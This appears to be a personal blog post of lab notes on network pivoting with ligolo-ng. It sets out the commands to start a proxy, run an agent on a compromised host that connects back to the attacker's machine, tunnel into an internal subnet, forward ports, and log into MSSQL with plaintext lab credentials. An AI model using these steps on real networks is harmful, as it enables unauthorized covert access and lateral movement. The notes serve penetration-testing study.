+++
date = '2026-02-23T11:11:32+09:00'
draft = false
title = 'Pivoting'
tags = ["ligolo"]
+++

# ligolo-ng

1. Set a proxy server

`sudo ligolo-proxy -selfcert -laddr "0.0.0.0:7878"`

2. Create an interface

`interface_create --name "evil-cha"`

3. Add route (Target's *internal* network)

`interface_add_route --name evil-cha --route 10.10.11.0/24`

4. Access to the proxy server from the target machine

`./agent -connect 192.168.45.224:7878 -ignore-cert`

5. Check sessions from the proxy

`session`

6. Start tunneling

`tunnel_start --tun evil-cha`

---

For local port forwarding. (3 machines case)

- Make sure the tunnel has started

- From ligolo-proxy add the port forwarding

`listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444`

Now the pivoting machine forwards inbound port (1234) to kali port (4444)

- Check with `listener_list`

---

Dynamic port forwarding (2 machines case)

- To access 127.0.0.1 network of the target machine

1. create an interface

`ifcreate --name ligolo`

2. Add route **240.0.0.1**

`interface_add_route --name ligolo --route 240.0.0.1/32`

3. Connect from the target machine

`.\agent.exe -connect :7878 -ignore-cert`

4. confirm session

`session`

5. Start the tunnel

`tunnel_start --tun ligolo`

6. Check the access

`impacket-mssqlclient hack.smarter/alice.wonderland:'Password1!'@240.0.0.1 -windows-auth`